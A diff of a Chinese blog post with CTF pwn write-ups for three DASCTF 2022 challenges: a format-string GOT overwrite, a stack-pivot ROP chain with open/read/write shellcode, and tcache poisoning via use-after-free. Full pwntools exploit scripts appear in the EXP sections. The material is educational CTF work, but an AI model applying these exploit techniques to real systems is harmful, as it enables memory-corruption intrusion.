@@ -20,56 +20,56 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="cyberprinter保护策略： 漏洞所在： 首先是printf函数%s可以泄露一个libc地址(让输入写满)，然后存在一个格式化字符串的洞，但是if进行了一些检查，无法利用%p或者%x来泄露地址，出题人这里仅仅就是想让我们去任意写而非任意读。 利用思路：由于程序是系统调用exit退出的，因此无法劫持exit里的结构体指针。 发现printf执行后，执行了一个puts，考虑去劫持IO里的某些指针">
+    <meta name="description" content="赛题WP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DASCTF X CBCTF 2022九月挑战赛 pwn部分wp">
 <meta property="og:url" content="https://zikh26.github.io/posts/da4f7b20.html">
 <meta property="og:site_name" content="ZIKH26&#39;s Blog">
-<meta property="og:description" content="cyberprinter保护策略： 漏洞所在： 首先是printf函数%s可以泄露一个libc地址(让输入写满)，然后存在一个格式化字符串的洞，但是if进行了一些检查，无法利用%p或者%x来泄露地址，出题人这里仅仅就是想让我们去任意写而非任意读。 利用思路：由于程序是系统调用exit退出的，因此无法劫持exit里的结构体指针。 发现printf执行后，执行了一个puts，考虑去劫持IO里的某些指针">
+<meta property="og:description" content="赛题WP">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220919100434467-653241350.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220919100444183-1653075701.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220919100457611-1949132916.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232808150.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232818671.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232830424.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232842582.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232853757.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232903914.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007232953300.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233119819.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233132958.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233216868.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233231650.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233251071.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233305866.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233317473.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233330115.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233338793.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233346476.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233356927.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233404888.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233412071.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233430592.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233448315.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233458822.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233511947.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233524690.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233539574.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233557237.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233639073.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233701615.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233720390.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233736715.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221007233750427.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956480.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956481.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956482.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011951983.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956483.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956484.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956485.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956486.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956487.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952330.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952726.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952347.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011953673.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011953823.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954448.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954850.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954693.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954652.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956488.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956489.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956490.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956491.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956492.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956493.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956494.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956495.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955958.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956496.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956497.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956498.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956499.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955331.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955798.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956109.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956096.png">
 <meta property="article:published_time" content="2023-05-14T23:36:47.491Z">
-<meta property="article:modified_time" content="2022-10-08T02:24:48.385Z">
+<meta property="article:modified_time" content="2023-07-01T11:57:17.838Z">
 <meta property="article:author" content="ZIKH26">
 <meta property="article:tag" content="栈迁移">
 <meta property="article:tag" content="格式化字符串漏洞">
 <meta property="article:tag" content="篡改got表">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zikh26.github.io/img/2706180-20220919100434467-653241350.png">
+<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956480.png">
 
 
 <link rel="canonical" href="https://zikh26.github.io/posts/da4f7b20.html">
@@ -166,7 +166,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">96</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -177,7 +177,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">100</span>
+        <span class="site-state-item-count">99</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -240,7 +240,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:57:17" itemprop="dateModified" datetime="2023-07-01T19:57:17+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -261,89 +261,92 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220919100434467-653241350.png"></p>
-<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/2706180-20220919100444183-1653075701.png"></p>
+    <div class="post-body" itemprop="articleBody"><p>赛题WP</p>
+<span id="more"></span>
+
+<h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956480.png"></p>
+<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956481.png"></p>
 <p>首先是printf函数%s可以泄露一个libc地址(让输入写满)，然后存在一个格式化字符串的洞，但是if进行了一些检查，无法利用%p或者%x来泄露地址，出题人这里仅仅就是想让我们去任意写而非任意读。</p>
 <h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>由于程序是系统调用exit退出的，因此无法劫持exit里的结构体指针。</p>
 <p>发现printf执行后，执行了一个puts，考虑去劫持IO里的某些指针。考虑去伪造stdout结构体里的vtable指针，控制其偏移，让__xsputn落在one_gadget上即可。但实际操作的时候发现vtable这个基地址中出现了0x78，结果导致了if判断时被过滤掉了，因此这个思路也断了。</p>
 <p>经过roderick和winmt师傅的提示，这题采用一种新的思路，来劫持libc中的got表。</p>
 <p>本题的libc保护如下：</p>
-<p><img src="/../img/2706180-20220919100457611-1949132916.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956482.png"></p>
 <p>可以看见保护是Partial RELRO，这就意味着我们可以篡改其函数的got表。</p>
 <p>而puts函数又调用了strlen函数，也就是在libc中执行puts函数时，又通过strlen函数的got表跳转到了strlen函数。</p>
 <p>我们去劫持strlen函数的got表为one_gadget即可。</p>
 <h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;print&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26047&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x13A0,0x13E9)</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Your name?pls..\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ec5c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">strlen_addr=libc_base+<span class="number">0x1EB0A8</span><span class="comment">#libc中strlen函数的got表地址</span></span><br><span class="line">one_gadget=search_og(<span class="number">1</span>)+libc_base</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">8</span>,writes=&#123;strlen_addr:one_gadget&#125;,numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/image-20221007232808150.png" alt="image-20221007232808150"></p>
-<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007232818671.png" alt="image-20221007232818671"></p>
-<h3 id="漏洞所在：-1"><a href="#漏洞所在：-1" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/image-20221007232830424.png" alt="image-20221007232830424"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011951983.png" alt="image-20230701195130333"></p>
+<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956483.png" alt="image-20221007232818671"></p>
+<h3 id="漏洞所在：-1"><a href="#漏洞所在：-1" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956484.png" alt="image-20221007232830424"></p>
 <p>这里存在一个溢出，虽然不会溢出到返回地址，但是后八个字节决定了下图read是往哪里输入的。</p>
-<p><img src="/../img/image-20221007232842582.png" alt="image-20221007232842582"></p>
-<p><img src="/../img/image-20221007232853757.png" alt="image-20221007232853757"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956485.png" alt="image-20221007232842582"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956486.png" alt="image-20221007232853757"></p>
 <p>上图这里泄露了一个地址，通过这个我们可以拿到程序基地址，而且这个地址也是接下来read往里面输入了0x108字节的地址。</p>
 <h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>其实这道题的意图很明显，出题人应该是想让我们迁移到这里(如下图)，因为这里我们是可以把rop链布置到这里的。</p>
-<p><img src="/../img/image-20221007232903914.png" alt="image-20221007232903914"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956487.png" alt="image-20221007232903914"></p>
 <p>然后去打rop，同时因为禁用了execve，因此最终应该是考虑打orw。</p>
 <p>我们先看看如何迁移到这个地址上。</p>
 <p>首先通过调试，我们发现如果我们在第一次输入里，最后的字节发8个a，那么最后一次的read的buf就会变成一堆a(如下)</p>
-<p><img src="/../img/image-20221007232953300.png" alt="image-20221007232953300"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952330.png" alt="image-20230701195205815"></p>
 <p>这个地址表面上是我们可控的，但是我们没有栈地址，因此其实是控制不了程序的执行流的。不过这里我观察了一下，这个read的buf正常的值(也就是不利用第一次输入的那个溢出)(如下)就是rbp，而正好可以控制rbp的值和返回地址(这也就是我们打栈迁移的条件)</p>
-<p><img src="/../img/image-20221007233119819.png" alt="image-20221007233119819"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952726.png" alt="image-20230701195216122"></p>
 <h4 id="rop链的构建"><a href="#rop链的构建" class="headerlink" title="rop链的构建"></a>rop链的构建</h4><p>然后我们那边的rop链的思路是先泄露libc地址，然后再执行一次read读进来一条新的rop链来打orw。但难点是我们无法控制rdx寄存器，导致read函数用残留的rdx中数据直接读的话，只能读进来16个字节的数据。(而这新读的16个字节数据，就可以使用libc里的gadget地址了)，因此我们使用一个libc里的pop rdx的gadget再执行一次read函数，来读入更多的数据。</p>
 <p>先说第一条链的第一部分（使用write函数进行libc地址的泄露（如下图），不知道为啥我这里用puts泄露不了）</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/image-20221007233132958.png" alt="image-20221007233132958"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952347.png" alt="image-20230701195233742"></p>
 <p>再说第一条链的第二部分（这个部分的意义就是把libc里这个pop rdx的gadget给读到内存里来，这里read函数的第二个参数需要布局一下）（如下图）</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>
 
 <p>通过对比下面两幅图，就可以发现输入前后，就把0xdeadbeef给覆盖成了pop_rdx_r12</p>
-<p><img src="/../img/image-20221007233216868.png" alt="image-20221007233216868"></p>
-<p><img src="/../img/image-20221007233231650.png" alt="image-20221007233231650"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011953673.png" alt="image-20230701195329000"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011953823.png" alt="image-20230701195353063"></p>
 <p>最后第一条链的第三部分（这部分是提前写好read的第一参数和第二个参数，但是第三个参数的位置，我用了0xdeadbeef来占位，因为在这条链的第二部分，read函数就将前两个0xdeadbeef覆盖成了pop_rdx_r12和0，这样第三条链实际上就是正常的了(第三个0xdeadbeef无所谓了，反正会被弹到r12寄存器里)）</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>
 
-<p>而执行完第一条链后，我们就可以在使用libc中任意gadget的前提下写入新的rop链。(如下图)<br><img src="/../img/image-20221007233251071.png" alt="image-20221007233251071"></p>
+<p>而执行完第一条链后，我们就可以在使用libc中任意gadget的前提下写入新的rop链。(如下图)<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954448.png" alt="image-20230701195416008"></p>
 <p>为了方便，我先去利用gadget传参且执行了mprotect函数，将这个内存页直接变成可读可写可执行了，最后跟了个orw的shellcode(最后orw这里有个坑，打远程不知道为啥，正常的orw在远程读不出来flag，而本地可以读出来。这里必须要先close(0)，然后再去打开flag文件，然后read从文件描述符0里读数据才行）</p>
 <p>调试过程如下：</p>
-<p><img src="/../img/image-20221007233305866.png" alt="image-20221007233305866"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954850.png" alt="image-20230701195425473"></p>
 <p>然后先用close把标准输入给关了，再打orw即可拿到flag</p>
-<p><img src="/../img/image-20221007233317473.png" alt="image-20221007233317473"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954693.png" alt="image-20230701195435306"></p>
 <h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;app&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29916&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1464)</span></span><br><span class="line">payload=<span class="string">&quot;\x00\x00Nameless&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s check your identity\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here you are:&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base_addr=leak_addr-<span class="number">0x4050</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x00000000000014cd</span>+base_addr</span><br><span class="line">pop_rdi=<span class="number">0x00000000000014d3</span>+base_addr</span><br><span class="line">pop_rsi_r15=base_addr+<span class="number">0x00000000000014d1</span></span><br><span class="line">leave=base_addr+<span class="number">0x00000000000012d8</span></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;And pls write your own information on it\n&quot;</span>,rop)</span><br><span class="line">p.sendafter(<span class="string">&quot;Tell me your wish:\n&quot;</span>,p64(leak_addr-<span class="number">8</span>)+p64(leave))</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x111040</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">pop_rsi=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">pop_rdx_r12=<span class="number">0x11c1e1</span>+libc_base</span><br><span class="line">pop_rax=libc_base+<span class="number">0x4a550</span></span><br><span class="line">syscall=<span class="number">0x000000000002584d</span>+libc_base</span><br><span class="line">mprotect=<span class="number">0x000000000011b970</span>+libc_base</span><br><span class="line">rop=p64(pop_rdx_r12)+p64(<span class="number">0x1000</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line">pause()</span><br><span class="line">rop=p64(pop_rdi)+p64(leak_addr-<span class="number">0x50</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(base_addr+<span class="number">0x4150</span>)</span><br><span class="line">rop+=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x49\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x50\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/image-20221007233330115.png" alt="image-20221007233330115"></p>
-<h2 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007233338793.png" alt="image-20221007233338793"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954652.png" alt="image-20230701195452211"></p>
+<h2 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956488.png" alt="image-20221007233338793"></p>
 <h3 id="漏洞所在：-2"><a href="#漏洞所在：-2" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>首先在show函数里程序自己泄露了一个libc地址。</p>
-<p><img src="/../img/image-20221007233346476.png" alt="image-20221007233346476"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956489.png" alt="image-20221007233346476"></p>
 <p>存在UAF漏洞：</p>
-<p><img src="/../img/image-20221007233356927.png" alt="image-20221007233356927"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956490.png" alt="image-20221007233356927"></p>
 <p>然后在申请堆块之后写入数据时会在用户区第三个内存单元开始输入数据(第一个内存单元用于存储一个size(如下)，第二个内存单元是空的)，但是输入的数据依然是malloc申请的size，这就意味着我们可以溢出下一个内存单元的prev_size和size位</p>
-<p><img src="/../img/image-20221007233404888.png" alt="image-20221007233404888"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956491.png" alt="image-20221007233404888"></p>
 <p><strong>而在delete函数中我们可以控制记录堆块的那个size(如下)，但恰巧这个位置是处于free状态的堆块的fd指针(这也是这道题的核心利用点)，因此我们可以在这里篡改堆块的fd指针</strong></p>
-<p><img src="/../img/image-20221007233412071.png" alt="image-20221007233412071"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956492.png" alt="image-20221007233412071"></p>
 <h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>本题我们可以控制被释放掉堆块的fd指针，同时还有libc地址，那就可以直接打tcache poisoning。</p>
 <p>我们先申请四个堆块，分别为chunk1、chunk2、chunk3、chunk4（都申请size为0x50即可）</p>
 <p>在chunk3中存入malloc_hook-0x10的地址</p>
 <p>然后我们再将其全部释放掉，进入tcache bin。<strong>我们去修改一下chunk2的fd指针让其不指向chunk3的地址而去指向chunk3中存放的malloc_hook-0x10处，如此就劫持了tcache bin的这条链，最后申请出来在malloc_hook上写一个one_gadget的地址即可。</strong></p>
 <p>调试过程如下：</p>
-<p><img src="/../img/image-20221007233430592.png" alt="image-20221007233430592"></p>
-<p><img src="/../img/image-20221007233448315.png" alt="image-20221007233448315"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956493.png" alt="image-20221007233430592"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956494.png" alt="image-20221007233448315"></p>
 <p>为什么当时打tcache poisoning的时候，需要让malloc_hook的地址-0x10（原因如下），<strong>因为数据是从用户区+0x10的位置开始写入的，因此申请的时候需要提前-0x10.</strong></p>
-<p><img src="/../img/image-20221007233458822.png" alt="image-20221007233458822"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956495.png" alt="image-20221007233458822"></p>
 <h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
